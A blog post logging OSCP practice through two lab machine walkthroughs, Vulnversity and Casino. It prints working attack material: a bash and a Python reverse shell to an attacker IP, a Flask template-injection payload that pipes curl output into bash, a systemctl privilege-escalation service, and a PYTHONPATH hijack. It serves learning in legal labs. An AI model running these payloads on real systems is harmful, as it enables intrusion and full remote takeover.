---
layout: post
title:  "OSCP Preparation Day Five"
date:   2020-07-14 20:05:48 +0100
categories: oscp
---

Before I can find the courage to start writing up the 10-12 boxes I lost a few days ago, I figured I would do some of the "OSCP Path" that can be found on [tryhackme](https://tryhackme.com).

For this, I will just be doing a writeup of all the machines they offer in this path.


## VULNERVERSITY

### NMAP
```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
On port 3333 there is a webserver running that we can run gobuster against to check for hidden directories.
### GOBUSTER
```
gobuster dir -u http://10.10.228.120:3333/ -w /opt/SecLists/Discovery/Web-Content/big.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.228.120:3333/
[+] Threads:        10
[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/07/16 15:05:29 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/internal (Status: 301)
```
From gobuster we can see an interesting directory `/internal`.
### /INTERNAL

On `/internal` there is a upload functionality. After attempting to upload a `.php` file it says that it's not an allowed Extension. We can fuzz this upload functionality to check for any other types of php upload we can upload here.

Using burps intruder we can change the extension of the file we upload and see if there is any file it allows. Through this, we discover that the `.phtml` file type is allowed and can upload a webshell using this extension and get a shell on the box as www-data.

### PRIV ESC
After running linpeas.sh on the box, it shows a vulnerable SUID program `systemctl`.
```
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/bin/systemctl
```
By heading to [GTFObins](https://gtfobins.github.io/gtfobins/systemctl/) will show us how to exploit this.

First create a service that will run a reverse shell script when loaded:
```
[Service]
Type=oneshot
ExecStart=/dev/shm/.pwn/reverse.sh
[Install]
WantedBy=multi-user.target
```
Here is the `reverse.sh` that will be run from the service.
```
#!/bin/bash

bash -i >& /dev/tcp/10.11.3.179/4444 0>&1
```
Now we can run the commands:
```
systemctl link /dev/shm/.pwn/exploit.service
systemctl enable --now /dev/shm/.pwn/exploit.service
```
And on our listener we will have a shell as root.

Now to clean up, we can remove the linked file at `/etc/systemd/system/multi-user.target.wants/exploit.service`, the webshell at `/var/www/html/internal/uploads/webshell.phtml` and do `rm -rf /dev/shm/.pwn` to remove anything else we uploaded.



## CASINO

Casino was a new box that came out on cyberseclabs. Since it was new I thought I would give it a try. It ended up being quite a fun box since I had never dealt with flask injections prior to this.

The `/search` page of this application is vulnerable to injection and with this we can get complete RCE through the web app to spawn a shell through the `search` paramter. 
```
search={{config.__class__.__init__.__globals__['os'].popen('curl 10.10.0.64/shell.sh|bash').read()}}
```
This will return a shell as www-data.

### PRIV ESC

After getting a shell as www-data, I noticed an interesting zip file
```
carla@casino:/var/www/webApp$ ls -la
total 1072
drwxr-xr-x 3 root root    4096 Jul 14 13:30 .
drwxr-xr-x 4 root root    4096 Jul 14 13:25 ..
-rw-r--r-- 1 root root 1080049 Jul 14 13:26 index.casino.csl.zip
drwxr-xr-x 4 root root    4096 Jul 14 13:55 webApp
-rw-r--r-- 1 root root     198 Jul 14 13:30 webapp.wsgi
```
I moved the file over to my machine and saw the source code for the webserver running on port 9000 with some interesting os.system calls.
```
@app.route("/admin", methods=["GET", "POST"])
def admin():
    if request.remote_addr != "127.0.0.1":
        return "Localhost Access Only!"
    else:
        if request.method == "POST" and request.form.get("cmd"):
            cmd = request.form.get("cmd")
            output = os.popen(cmd).read() # os.system(cmd) # os.popen("command").read()
            flash(output, "info")
        return render_template('admin.html')

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=9000)
```
Also inside this zip file was `x.py` which showcased the RCE for me (I think this was an oversight of the creator as they didn't seem to have intended it after speaking with them). 

Here is the x.py that I modified to get a reverse shell for me.
```
#!/usr/bin/env python3

from urllib.parse import *
import requests

def convertToPost(url):
    parsed = urlparse(url)
    parsedURL = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    return parsedURL, parse_qs(parsed.query)

url, data = convertToPost("http://localhost:9000/admin?cmd=curl%2010.10.0.64/shell.sh|bash")
print(url, data)
requests.post(url, data).text
```
Now we can run the python program as www-data and get a shell on our listener as user grey.

From here we can check through the .git folder of the project inside the /home/grey directory.

Before rooting this I actually didn't know about the `git show` command, and instead used this script to read the contents:
```
import zlib
f = open("out","r") # out in this context is just a cleaned up output of "find" command inside the objects directory.
names = f.readlines()
for name in names:

	filename = "/home/corn/ctf/cyberseclab/challenge/casino/web/priv/objects/" +name[:-1]
	compressed_contents = open(filename, 'rb').read()
	decompressed_contents = zlib.decompress(compressed_contents)
	print(decompressed_contents)
```
Contents of the git objects:
```
# beta user: carla
# password: >F73SzS36>V$tJmc
```
Now we can log in as carla to see we can run the following command as root:
```
carla@casino:/home/grey$ sudo -l
[sudo] password for carla: 
Matching Defaults entries for carla on casino:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carla may run the following commands on casino:
    (root) SETENV: /opt/updateBTCPrice.py
```
```
carla@casino:/opt$ cat updateBTCPrice.py 
#!/usr/bin/python3

from datetime import datetime
import requests

print(datetime.now())

try:
	price = requests.get("https://www.coinbase.com/price/bitcoin").text
	btcPrice = open('/var/www/webApp/webApp/templates/btc.price', 'w')
	btcPrice.write(price)
	btcPrice.close()
	import os
	os.system("service apache2 restart")
except:
	print("ERROR: Could not connect to coinbase!")
```
since we can use SETENV on this sudo command, we can specify a `PYTHONPATH` variable in the command to make python run what we want it to.

In this case, I made a `requests.py` file and placed it in the /tmp directory with the contents:
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.0.64",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
```
Now when we run the command `sudo PYTHONPATH=/tmp /opt/updateBTCPrice.py` we will have a shell as root on our listener.


2 boxes is not too much content, since I only worked on these for about 2 and a half hours total, but I also did complete the sneakymailer HTB machine so that took a couple more hours of my time too.

I'll continue to write about the tryhackme boxes over the next few days while I wait for new HTB machines and OSCP to start.